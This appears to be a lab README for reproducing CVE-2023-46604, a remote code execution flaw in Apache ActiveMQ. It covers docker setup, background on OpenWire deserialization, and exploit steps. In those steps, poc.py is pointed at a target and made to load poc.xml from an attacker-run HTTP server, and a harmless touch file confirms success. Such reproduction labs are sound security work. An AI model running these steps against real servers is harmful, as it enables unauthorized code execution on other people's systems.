# Apache ActiveMQ (Version < 5.18.3) RCE （CVE-2023-46604）

[中文版本(Chinese version)](README.zh-cn.md)

## Environment setup

Enter following commands to build and run the vulnerability environment:

```
docker compose up -d
```

The environment listens to port 61616 and port 8161, of which 61616 is the working port. In this vulnerability exploitation, we only need to use port 61616. When executing the vulnerability verification process, please first access port 8161 to confirm that the service has started successfully.

Visit `http://your-ip:8161/` to see the web page, indicating that the environment has been successfully run.

## Background brief

Apache ActiveMQ has a remote code execution vulnerability. This vulnerability may allow remote attackers with network access privileges to execute arbitrary shell commands by manipulating the serialized class types in the OpenWire protocol, leading to the instantiation of any class on the classpath of the agent.

| Default port | Default Condition                    |
|--------------|--------------------------------------|
| 8161 (web)   | Remote access requires configuration |
| 61616 (tcp)  | Remote access allowed                |

## Exploit

You can quickly start an HTTP server in the folder where the poc.xml file is located using the Python3 http.server module

```shell
python3 -m http.server 6666
```

execute poc.py

```shell
python3 poc.py target port http://ip of http server/poc.xml
```

You can check inside the ActiveMQ container using the following command:

docker exec cve-2023-46604-activemq-1 ls -l /tmp

If you see the output showing that touch /tmp/activeMQ-RCE-success has been executed successfully, then the exploit has worked.

![01.png](01.png)